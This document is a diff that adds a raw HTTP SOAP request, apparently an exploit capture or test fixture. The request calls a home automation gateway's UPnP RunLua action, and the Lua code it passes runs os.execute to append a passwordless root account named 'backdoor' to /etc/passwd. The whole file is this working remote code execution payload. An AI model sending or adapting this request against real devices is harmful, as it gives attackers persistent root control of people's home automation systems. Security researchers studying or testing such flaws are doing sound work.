@@ -1,0 +1,22 @@
+POST /upnp/control/hag HTTP/1.1
+Host: www.example.com:49451
+Accept: text/javascript, text/html, application/xml, text/xml, */*
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+X-Prototype-Version: 1.7
+Content-Type: text/xml;charset=UTF-8
+MIME-Version: 1.0
+SOAPACTION: "urn:www-example1-com:service:HomeAutomationGateway:1#RunLua"
+Content-Length: 311
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+<s:Envelope s:encodingStyle="http://www.example1.com/soap/encoding/"; 
+xmlns:s="http://www.example1.com/soap/envelope/";><s:Body>    <u:RunLua 
+xmlns:u="urn:www-example1-com:service:HomeAutomationGateway:1">        <DeviceNum></DeviceNum> 
+<Code>os.execute(&quot;echo 'backdoor%3a%3a0%3a0%3aBackdoor Root Account%3a/tmp%3a/bin/ash' %3e%3e 
+/etc/passwd&quot;)</Code>    </u:RunLua></s:Body></s:Envelope>
+
+
